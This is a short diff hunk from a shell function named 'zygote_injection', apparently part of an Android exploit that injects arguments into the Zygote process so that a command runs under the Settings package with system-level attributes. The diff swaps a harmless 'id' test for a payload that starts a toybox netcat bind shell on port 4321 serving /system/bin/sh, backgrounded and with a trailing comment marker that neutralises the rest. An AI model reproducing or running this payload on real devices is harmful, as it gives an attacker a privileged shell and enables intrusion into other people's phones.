@@ -117,7 +117,7 @@ zygote_injection() {
 --nice-name=runnetcat
 --seinfo=platform:isSystemServer:privapp:targetSdkVersion=28:complete
 --invoke-with
-id >/sdcard/1.txt
+/system/bin/sh -c "toybox nc -l -p 4321 -L /system/bin/sh -s 127.0.0.1 > /dev/null 2>&1 & #"
 --instruction-set=arm
 --app-data-dir=/data/
 --package-name=com.android.settings
